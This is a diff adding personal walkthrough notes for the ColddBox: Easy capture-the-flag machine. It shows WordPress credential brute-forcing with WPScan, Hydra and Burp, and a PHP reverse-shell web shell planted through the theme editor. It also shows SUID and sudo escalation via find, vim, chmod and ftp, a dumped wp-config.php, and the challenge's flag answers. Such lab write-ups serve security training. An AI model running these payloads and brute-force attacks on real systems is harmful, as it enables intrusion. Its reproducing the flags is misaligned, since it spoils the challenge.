@@ -378,3 +378,383 @@ Interesting Finding(s):
  |  - http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'
 
 [+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:08 <============================> (137 / 137) 100.00% Time: 00:00:08
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Wp Login against 3 user/s
+[SUCCESS] - c0ldd / 9876543210                                                                             
+^Cying hugo / chocolate1 Time: 00:08:01 <                         > (4160 / 43034400)  0.00%  ETA: ??:??:??
+[!] Valid Combinations Found:
+ | Username: c0ldd, Password: 9876543210
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.00)  0.00%  ETA: ??:??:??
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Dec 26 11:36:28 2022
+[+] Requests Done: 4306
+[+] Cached Requests: 36
+[+] Data Sent: 1.38 MB
+[+] Data Received: 15.305 MB
+[+] Memory used: 300.328 MB
+[+] Elapsed time: 00:08:30
+
+Scan Aborted: Canceled by User
+
+8 minutes
+
+c0ldd:9876543210
+
+another way using hydra
+
+just go to 10.10.95.155/wp-admin, then test with a user and pass, then inspect network, request. 
+and see the form data
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -L cold_users -P /usr/share/wordlists/rockyou.txt 10.10.95.155 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in&testcookie=1:S=Location'
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-26 11:42:10
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
+[DATA] attacking http-post-form://10.10.95.155:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in&testcookie=1:S=Location
+
+[80][http-post-form] host: 10.10.95.155   login: c0ldd   password: 9876543210
+
+https://forum.portswigger.net/thread/can-t-add-large-wordlists-to-burp-pro-intruder-3950f659
+
+another way can be burp intruder, not Intruder isn't really designed to such large wordlists. It's intended as an interactive application, where you'll be manually working with the results. For really large wordlists you're generally better using dedicated brute force software like Hydra.
+
+cz to load is 8.745.094 to load and will crash 
+
+yep it works, but instead use like this.
+log=c0ldd&pwd=§test§&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.95.155%2Fwp-admin%2F&testcookie=1
+
+and in payload, payload type: runtime file (/usr/share/wordlists/rockyou.txt)
+and search for length (948 Ok ) and (3863 wrong) (last 10 seconds to give the right pass :) )
+
+hugp and philip cannot found just use c0ldd to login
+
+webshell
+
+or can be using weevely https://www.kali.org/tools/weevely/
+
+Weevely is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones.
+
+https://istillknowkungfu.com/Shells/Webshells/#wordpress
+
+go to appearance -> editor then upload it and save.
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1'")
+?>
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337                                 
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+
+go to 
+http://10.10.95.155/wp-content/themes/twentyfifteen/404.php
+
+and get revshell
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337                                 
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.95.155.
+Ncat: Connection from 10.10.95.155:50300.
+bash: cannot set terminal process group (1331): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ whoami
+whoami
+www-data
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ export TERM=xterm
+</www/html/wp-content/themes/twentyfifteen$ export TERM=xterm                
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ export SHELL=bash
+LL=bashSHE 
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ which python3
+on3ch pyth 
+/usr/bin/python3
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+ 'import pty;pty.spawn("/bin/bash")'
+www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ 
+
+www-data@ColddBox-Easy:/var/www/html$ ls
+ls
+hidden           wp-blog-header.php    wp-includes        wp-signup.php
+index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
+license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
+readme.html      wp-config.php         wp-login.php
+wp-activate.php  wp-content            wp-mail.php
+wp-admin         wp-cron.php           wp-settings.php
+www-data@ColddBox-Easy:/var/www/html$ cat hidden
+cat hidden
+cat: hidden: Is a directory
+www-data@ColddBox-Easy:/var/www/html$ cd hidden
+cd hidden
+www-data@ColddBox-Easy:/var/www/html/hidden$ ls
+ls
+index.html
+www-data@ColddBox-Easy:/var/www/html/hidden$ cat index.html
+cat index.html
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
+<title>Hidden Place</title>
+</head>
+<body>
+<div align="center">
+<h1>U-R-G-E-N-T</h1>
+<h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
+</div>
+</body>
+</html> 
+
+www-data@ColddBox-Easy:/var/www/html/hidden$ find / -type f -name user.txt 2>/dev/null
+v/null -type f -name user.txt 2>/de 
+/home/c0ldd/user.txt
+www-data@ColddBox-Easy:/var/www/html/hidden$ cd /home/c0ldd
+cd /home/c0ldd
+www-data@ColddBox-Easy:/home/c0ldd$ ls
+ls
+user.txt
+www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+
+www-data@ColddBox-Easy:/home/c0ldd$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
+gs ls -lahrm -4000 -type f 2>/dev/null | xar 
+-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root        40K Jan 27  2020 /bin/mount
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root   root        40K Mar 26  2019 /bin/su
+-rwsr-xr-x 1 root   root        27K Jan 27  2020 /bin/umount
+-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at
+-rwsr-xr-x 1 root   root        71K Mar 26  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        40K Mar 26  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root   root       217K Feb  8  2016 /usr/bin/find
+-rwsr-xr-x 1 root   root        74K Mar 26  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root        33K Mar 26  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root        39K Mar 26  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        33K Mar 26  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root        53K Mar 26  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        23K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root       134K Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       419K May 27  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root   root       109K Jul 10  2020 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root        83K Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+https://gtfobins.github.io/gtfobins/find/
+
+www-data@ColddBox-Easy:/home/c0ldd$ /usr/bin/find . -exec /bin/sh -p \; -quit
+/usr/bin/find . -exec /bin/sh -p \; -quit
+```
+```text
+# whoami
+whoami
+root
+```
+```text
+# ls
+ls
+user.txt
+```
+```text
+# cat user.txt
+cat user.txt
+RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
+```
+```text
+# cat /root/root.txt
+cat /root/root.txt
+wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
+
+another way
+
+www-data@ColddBox-Easy:/home/c0ldd$ cd /var/www/html
+cd /var/www/html
+www-data@ColddBox-Easy:/var/www/html$ ls
+ls
+hidden           wp-blog-header.php    wp-includes        wp-signup.php
+index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
+license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
+readme.html      wp-config.php         wp-login.php
+wp-activate.php  wp-content            wp-mail.php
+wp-admin         wp-cron.php           wp-settings.php
+www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
+cat wp-config.php
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'colddbox');
+
+/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'cybersecurity');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
+define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
+define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
+define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
+define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
+define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
+define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
+define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+        define('ABSPATH', dirname(__FILE__) . '/');
+
+define('WP_HOME', '/');
+define('WP_SITEURL', '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+c0ldd : cybersecurity
+
+www-data@ColddBox-Easy:/var/www/html$ su c0ldd
+su c0ldd
+Password: cybersecurity
+
+c0ldd@ColddBox-Easy:/var/www/html$ cat /home/c0ldd/user.txt
+cat /home/c0ldd/user.txt
+RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
+c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for c0ldd: cybersecurity
+
+Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
+    (root) /usr/bin/vim
+    (root) /bin/chmod
+    (root) /usr/bin/ftp
+
+three different ways 
+
+c0ldd@ColddBox-Easy:/var/www/html$ sudo vim -c ':!/bin/sh'
+sudo vim -c ':!/bin/sh'
+```
+```text
+# whoami
+whoami
+root
+
+"sudo chmod -R 755 /root" es un comando de Linux que se utiliza para cambiar los permisos de acceso de un directorio o archivo. La opción "-R" indica que se deben cambiar los permisos recursivamente para todos los archivos y subdirectorios en el directorio especificado. En este caso, el directorio especificado es "/root", que es el directorio principal del usuario root en Linux.
+
+Los permisos de acceso controlan quién puede acceder a un archivo o directorio y qué tipo de acceso pueden tener. Los permisos se dividen en tres categorías: propietario, grupo y otros. Los permisos se representan con números octales, y cada número octal representa un conjunto de permisos.
+
+El número "755" es un número octal que se utiliza a menudo para establecer permisos de acceso para archivos y directorios. Los permisos establecidos por "755" son:
+
+-   7: permisos de lectura, escritura y ejecución para el propietario
+-   5: permisos de lectura y ejecución para el grupo
+-   5: permisos de lectura y ejecución para otros
+
+En resumen, el comando "sudo chmod -R 755 /root" se utiliza para establecer permisos de lectura, escritura y ejecución para el propietario del directorio /root y permisos de lectura y ejecución para el grupo y otros para todos los archivos y subdirectorios en /root de manera recursiva.
+
+c0ldd@ColddBox-Easy:/var/www/html$ sudo chmod -R 755 /root; cat /root/root.txt
+sudo chmod -R 755 /root; cat /root/root.txt
+wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
+
+https://gtfobins.github.io/gtfobins/ftp/
+
+c0ldd@ColddBox-Easy:/var/www/html$ sudo ftp
+sudo ftp
+ftp> !/bin/sh
+!/bin/sh
+```
+```text
+# whoami
+whoami
+root
+
+:)
+```
+![[Pasted image 20221226113605.png]]
+![[Pasted image 20221226121553.png]]
+![[Pasted image 20221226123208.png]]
+user.txt
+Provide the flag in its encoded format
+*RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==*
+root.txt
+Provide the flag in its encoded format
+*wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=*
+
+## Notes / Lessons Learned
+[[All in One]]
+
